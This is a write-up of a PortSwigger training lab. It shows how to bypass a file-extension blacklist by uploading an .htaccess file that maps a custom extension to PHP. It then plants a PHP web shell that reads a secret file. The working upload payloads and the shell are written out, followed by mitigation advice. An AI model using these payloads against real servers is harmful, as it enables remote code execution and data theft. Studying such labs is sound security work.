
**Lab:** Web shell upload via extension blacklist bypass (PortSwigger)

**Objective:** Bypass the blacklist, upload a web shell, and exfiltrate the contents of `/home/carlos/secret`.

**Methodology:** Overriding Server Configuration (`.htaccess`) + Web Shell

## The Vulnerability

The web application attempts to prevent remote code execution by blocking uploads of files with known dangerous extensions, such as `.php`.

However, the blacklist is incomplete. It fails to block the upload of server configuration files, specifically the Apache `.htaccess` file.

By uploading a custom `.htaccess` file to the upload directory, an attacker can override the global Apache configuration for that specific folder. This allows the attacker to arbitrarily map a benign or unknown file extension to the executable PHP MIME type.

## Exploitation Steps

### Step 1: Override the Server Configuration

First, we need to upload a malicious `.htaccess` file to trick the Apache server into executing a custom file extension as PHP.

1. Intercept any image upload request using Burp Suite Proxy.

2. Send the request to Repeater.

3. Modify the `Content-Disposition` filename to `.htaccess`.

4. Clear the original image binary data from the body and replace it with the Apache configuration directive.

The modified payload section looks like this:

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .hau
```
Send the request. The server responds with 200 OK, successfully applying the new rule to the /files/avatars/ directory.

Step 2: Upload the Web Shell
Now that the server is configured to treat .hau files as PHP scripts, we can bypass the blacklist by using this custom extension.

In the same Repeater tab, change the filename to shell.hau.

Replace the .htaccess payload with the PHP web shell.

The modified payload section looks like this:
```
Content-Disposition: form-data; name="avatar"; filename="shell.hau"
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
Send the request. The server responds with 200 OK, bypassing the .php blacklist.

Step 3: Execute the Payload
Open a browser or use a GET request in Burp Suite to navigate directly to the uploaded file:

```
https://[YOUR-LAB-ID].web-security-academy.net/files/avatars/shell.hau
```
Because of the .htaccess rule we planted in Step 1, the Apache server executes shell.hau as a PHP script.

The browser displays the secret string. Copy and submit it to solve the lab.

Mitigation
To prevent this vulnerability, developers and system administrators should:

Never use a blacklist approach for file extensions. Always use a strict whitelist of allowed extensions.

Block the upload of any hidden files or configuration files (like .htaccess, web.config).

Disable the ability for .htaccess files to override configurations in upload directories by setting AllowOverride None in the main Apache configuration file.

<img width="1711" height="985" alt="image" src="https://github.com/user-attachments/assets/eb48b558-f842-4330-bde7-2b11152a1c70" />

<img width="1708" height="997" alt="image" src="https://github.com/user-attachments/assets/21f94f08-9876-4850-b554-14e57cda10f9" />

